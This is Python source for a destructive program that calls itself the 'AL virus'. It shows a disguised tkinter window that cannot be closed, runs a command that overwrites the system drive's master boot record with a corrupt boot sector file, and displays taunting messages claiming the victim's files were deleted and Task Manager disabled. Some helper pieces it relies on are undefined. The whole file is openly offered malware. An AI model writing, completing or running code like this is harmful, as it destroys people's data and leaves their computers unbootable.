# Importing necessary modules to make the Shell replacement work.
from tkinter import *
import WINTCMD
# Defining the tkinter window
root = Tk()
root.title("User Notification Service (Win32)")
root.configure(bg='black')
root.geometry('600x300')
root.iconbitmap('al.ico')
root.resizable(False,False)
# Defines an empty function for disable_event
def disable_event():
    pass
# Defines the function used to disable the close window button and the Alt+F4 shortcut.
root.protocol("WM_DELETE_WINDOW", disable_event)
# Defines the destroy_bootsect function used by this program
def destroy_bootsect():
    WINTCMD.term('%windir%\\bmgr.exe /DEVICE=%systemdrive% /mbr /restore /file="%windir%\\bootsect-corrupt.bin" /quiet')
# Defines some labels used to notify the user of what happened to their computer.
lbl0 = Label(root, text="It looks like your computer has been PERMANENTLY locked with the AL virus!", bg='black', fg='white')
lbl0.grid(column=0, row=1, sticky='w')
lbl1 = Label(root, text="\nThis virus has deleted all your files that are stored in your %userprofile%", bg='black', fg='white')
lbl1.grid(column=0, row=2, sticky='w')
lbl2 = Label(root, text="\nI also have corrupted your computer's bootsector, so you won't be able to use it again.", bg='black', fg='white')
lbl2.grid(column=0, row=3, sticky='w')
lbl3 = Label(root, text="\nIt's your time to regret.", bg='black', fg='white')
lbl3.grid(column=0, row=4, sticky='w')
lbl4 = Label(root, text="\nIf you think that closing me will return your computer to it's previous state, then try to close me.", bg='black', fg='white')
lbl4.grid(column=0, row=5, sticky='w')
lbl5 = Label(root, text="\n-The AL Virus team.", bg='black', fg='white')
lbl5.grid(column=0, row=6, sticky='w')
lbl6 = Label(root, text="\nProudly coded in Python.", bg='black', fg='white')
lbl6.grid(column=0, row=7, sticky='w')
lbl7 = Label(root, text="\nIf you think that you can close me using Task Manager, then I must tell you that I have disabled it!", bg='black', fg='white')
lbl7.grid(column=0, row=8, sticky='w')
destroy_bootsect()
root.mainloop()